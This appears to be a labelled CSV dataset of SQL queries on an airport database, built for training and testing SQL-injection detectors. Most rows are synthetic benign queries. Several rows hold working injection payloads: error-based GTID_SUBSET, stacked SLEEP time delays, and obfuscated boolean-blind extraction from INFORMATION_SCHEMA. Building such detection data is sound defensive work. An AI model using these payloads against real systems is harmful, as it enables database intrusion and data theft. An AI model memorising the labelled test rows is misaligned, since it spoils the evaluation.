"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.7 AND  118.175  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  126.225  AND  122.15  ORDER BY frequency;",0,122.7 118.175 126.225 122.15,,,,select,airport-S13,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""BW-CH"", ""Dobrova-Polhov Gradec"", ""SA"", ""MT"", ""https://en.wikipedia.org/wiki/M%C3%A9d%C3%A9a_Province'))) AND GTID_SUBSET/**/(CONCAT/**/(0x71716b7171,(SELECT (ELT/**/(4631=4631,1))),0x7162767071),4631) AND ((('rvZY' LIKE 'rvZY"", ""Airports in Al Jufrah District"")",1," BW-CH Dobrova-Polhov Gradec SA MT https://en.wikipedia.org/wiki/M%C3%A9d%C3%A9a_Province'))) AND GTID_SUBSET/**/(CONCAT/**/(0x71716b7171,(SELECT (ELT/**/(4631=4631,1))),0x7162767071),4631) AND ((('rvZY' LIKE 'rvZY Airports in Al Jufrah District ",recon,commentbeforeparentheses,success,insert,airport-I4,error-19,error,test
"DELETE FROM airport_frequencies WHERE type = ""GND"";",0,GND,,,,delete,airport-D4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GE"" GROUP BY r.name ORDER BY r.name ASC;",0,GE,,,,select,airport-S5,,,test
"SELECT id FROM airports WHERE elevation_feet >= 4232.0 AND latitude >= 44.51415 AND name LIKE ""%6P7QcpjROYf2f1z7X1Y5%"" AND scheduled_service = ""no"" AND ( FIND_IN_SET(""EWdWvqCZgz6r8AUR61gq"", keywords_field) > 0 OR FIND_IN_SET(""XizuHPNzKxSvJ0CrFny6"", keywords_field) > 0) AND type = ""small_airport"" AND longitude <= -92.829201",0,4232.0 44.51415 6P7QcpjROYf2f1z7X1Y5 no EWdWvqCZgz6r8AUR61gq XizuHPNzKxSvJ0CrFny6 small_airport -92.829201,,,,select,airport-S23,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""TV"" GROUP BY r.name ORDER BY r.name ASC;",0,TV,,,,select,airport-S5,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""US-12247"", ""heliport"", ""ObGES Airfield"", 55.709512, -78.9297027588, 46.0)",0,US-12247 heliport ObGES Airfield 55.709512 -78.9297027588 46.0,,,,insert,airport-I2,,,train
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-8103"",""small_airport"", ""Hon Creek Airport"",""https://en.wikipedia.org/wiki/Suc%C3%BAa_Airport"",""AS"")",0,US-8103 small_airport Hon Creek Airport https://en.wikipedia.org/wiki/Suc%C3%BAa_Airport AS,,,,insert,airport-I3,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"UPDATE airport SET municipality = ""Seoul"" WHERE iso_country = ""US""",0,Seoul US,,,,update,airport-U2,,,test
"SELECT * FROM airport WHERE gps_code = ""EPGW"" OR local_code = ""HFM""",0,EPGW HFM,,,,select,airport-S4,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""US-NE""",0,SA US-NE,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""EH"" GROUP BY r.name ORDER BY r.name ASC;",0,EH,,,,select,airport-S5,,,test
"SELECT * FROM airport WHERE gps_code = ""PS99"" OR local_code = ""XS66""",0,PS99 XS66,,,,select,airport-S4,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Central Banat District"";",0,Central Banat District,,,,select,airport-S15,,,train
"DELETE FROM airport_frequencies WHERE type = ""MISC"";",0,MISC,,,,delete,airport-D4,,,test
"SELECT * FROM airport WHERE gps_code = ""SOCA"" OR local_code = ""3L2""",0,SOCA 3L2,,,,select,airport-S4,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Plato Airfield"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Plato Airfield,,,,select,airport-S14,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Douglas;""",0,Douglas,,,,select,airport-S21,,,test
"UPDATE airport SET municipality = ""Tampere"" WHERE iso_country = ""US""",0,Tampere US,,,,update,airport-U2,,,train
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 489.0 AND 6201.0",0,489.0 6201.0,,,,select,airport-S2,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,train
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (67301, 27136, ""DE-0118"", ""MISC"", ""CTAF');(select * from (select(SLEEP(5)))MhxD)-- UfHX"", 34.94)",1," 67301 27136 ""DE-0118"" ""MISC"" ""CTAF' ;(select * from (select(SLEEP(5   MhxD -- UfHX"" 34.94 ",recon,lowercase,failure,insert,airport-I8,stacked-45,stacked,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""US-IL""",0,AS US-IL,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""KE"" GROUP BY r.name ORDER BY r.name ASC;",0,KE,,,,select,airport-S16,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CX"" GROUP BY r.name ORDER BY r.name ASC;",0,CX,,,,select,airport-S16,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (85369, ""GP"", ""Matecana"", ""NDB"", 368, ""IT"")",0,85369 GP Matecana NDB 368 IT,,,,insert,airport-I10,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""6183"" AS SIGNED) AND a.iso_country = ""ZW"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,6183 ZW,,,,select,airport-S22,,,test
"DELETE FROM airport WHERE name LIKE ""Woodbridge Airfield"" OR keywords LIKE ""F48, KF48"";  ",0,"Woodbridge Airfield F48, KF48",,,,delete,airport-D3,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1399"" AS SIGNED) AND a.iso_country = ""CM"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1399 CM,,,,select,airport-S22,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('KI54','EG-0056','US-1664','GR-0088');",0,KI54 EG-0056 US-1664 GR-0088,,,,update,airport-U10,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 262.0 AND 1624.0",0,262.0 1624.0,,,,select,airport-S2,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Coos Bay;""",0,Coos Bay,,,,select,airport-S21,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Orlando Apopka Airport"");",0,Orlando Apopka Airport,,,,select,airport-S12,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 2474.0 AND 197.0",0,2474.0 197.0,,,,select,airport-S2,,,test
"UPDATE regions SET keywords = ""Airports in Ntcheu District"" WHERE iso_country = ""CD"";",0,Airports in Ntcheu District CD,,,,update,airport-U9,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""RPSP"", ""small_airport"", ""NR3 Farms Airport"", 53.210445, -78.16000366210938, 5.0)",0,RPSP small_airport NR3 Farms Airport 53.210445 -78.16000366210938 5.0,,,,insert,airport-I2,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""LB32"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""RCN, RCN"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""WI49"", ""%"");",0,"LB32 RCN, RCN WI49",,,,select,airport-S17,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""BT"", ""Belarus"", ""EU"", ""Airports in Malawi"")",0,BT Belarus EU Airports in Malawi,,,,insert,airport-I6,,,train
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 955.0 AND 2700.0",0,955.0 2700.0,,,,select,airport-S2,,,test
"SELECT * FROM airport WHERE gps_code = ""5IA5"" OR local_code = ""09TA""",0,5IA5 09TA,,,,select,airport-S4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MY"" GROUP BY r.name ORDER BY r.name ASC;",0,MY,,,,select,airport-S5,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""TG"" OR c.name LIKE CONCAT(""%"", ""Vatican City"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,TG Vatican City 3,,,,select,airport-S20,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1650.0 AND 197.0",0,1650.0 197.0,,,,select,airport-S2,,,test
"DELETE FROM countries WHERE code = ""KN"";",0,KN,,,,delete,airport-D7,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (94299, ""KRA"", ""Calde"", ""NDB"", 242, ""MZ"")",0,94299 KRA Calde NDB 242 MZ,,,,insert,airport-I10,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""BR-MG""",0,EU BR-MG,,,,select,airport-S8,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Kremmling Memorial Hospital Heliport"" aND 2016=(SELEcT (Case WhEN (OrD(MId((SELEcT ifNULl(casT(cOLumn_NAME aS NchAR),0x20) fROM INFORMATION_SCHEMA.CoLUMNs WHere tABle_Name=0x72756e77617973 aND table_schema=0x64617461736574 LIMit 1,1),2,1))>96) THEn 2016 elSe (SELEcT 8473 uNioN SELEcT 1613) EnD))-- -"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",1," Kremmling Memorial Hospital Heliport"" aND 2016=(SELEcT (Case WhEN (OrD(MId((SELEcT ifNULl(casT(cOLumn_NAME aS NchAR),0x20) fROM INFORMATION_SCHEMA.CoLUMNs WHere tABle_Name=0x72756e77617973 aND table_schema=0x64617461736574 LIMit 1,1),2,1))>96) THEn 2016 elSe (SELEcT 8473 uNioN SELEcT 1613) EnD))-- - ",exploit,randomcase,success,select,airport-S14,boolean-228,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SH"" GROUP BY r.name ORDER BY r.name ASC;",0,SH,,,,select,airport-S5,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 1690.0",0,US 1690.0,,,,select,airport-S11,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 126.3 AND  121.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  128.225  AND  118.2  ORDER BY frequency;",0,126.3 121.7 128.225 118.2,,,,select,airport-S13,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""20LS"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Pembroke"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Ethiopian airports"", ""%"");",0,20LS Airports in Pembroke Ethiopian airports,,,,select,airport-S18,,,test
"SELECT id FROM airports WHERE latitude BETWEEN 49.9801 AND -34.6217 AND ( FIND_IN_SET(""axKoa6GDNyuTqmHvRk5C"", keywords_field) > 0 OR FIND_IN_SET(""TjzjRMVe1K3SBlb8Y0Rr"", keywords_field) > 0 OR FIND_IN_SET(""ILdSuRPOQUVMhOucerwG"", keywords_field) > 0) AND longitude BETWEEN 134.904728 AND 47.725389 AND type = ""small_airport"" AND scheduled_service LIKE ""no""",0,49.9801 -34.6217 axKoa6GDNyuTqmHvRk5C TjzjRMVe1K3SBlb8Y0Rr ILdSuRPOQUVMhOucerwG 134.904728 47.725389 small_airport no,,,,select,airport-S23,,,train
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (54214, 18377' and 9511=6881 and 'BnRv'='BnRv, ""KGBD"", ""CTAF"", ""HOUSTON CNTR"", 123.65)",1," 54214 18377' and 9511=6881 and 'BnRv'='BnRv ""KGBD"" ""CTAF"" ""HOUSTON CNTR"" 123.65 ",recon,lowercase,failure,insert,airport-I8,boolean-42,boolean,test
"UPDATE airport SET municipality = ""Yokohama"" wHeRe 1632=1632 And 7256=(SELeCt (cAsE WhEn (oRd(mId((SELeCt IfNuLL(caST(cOLUmn_NAME aS nchAR),0x20) FrOM INFORMATION_SCHEMA.colUmnS wHeRe TabLe_NAME=0x616972706f7274 And table_schema=0x64617461736574 lImit 7,1),7,1))>96) THen 7256 ElSe (SELeCt 5885 uNioN SELeCt 4784) eND))-- -"" WHERE iso_country = ""US""",1," Yokohama  wHeRe 1632=1632 And 7256=(SELeCt (cAsE WhEn (oRd(mId((SELeCt IfNuLL(caST(cOLUmn_NAME aS nchAR),0x20) FrOM INFORMATION_SCHEMA.colUmnS wHeRe TabLe_NAME=0x616972706f7274 And table_schema=0x64617461736574 lImit 7,1),7,1))>96) THen 7256 ElSe (SELeCt 5885 uNioN SELeCt 4784) eND))-- - US ",exploit,randomcase,success,update,airport-U2,boolean-66,boolean,test
"UPDATE airport_frequencies SET description = ""BRISBANE CNTR"";SELECT IF/**/((49=75),SLEEP/**/(5),1131)#"" WHERE airport_ident = ""KMNF"";",1," BRISBANE CNTR SELECT IF/**/((49=75),SLEEP/**/(5),1131)# KMNF ",recon,commentbeforeparentheses,success,update,airport-U5,stacked-81,stacked,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (64683, 3265, ""YPED"", ""UNIC"", ""ATIS"", 122.9)",0,64683 3265 YPED UNIC ATIS 122.9,,,,insert,airport-I8,,,test
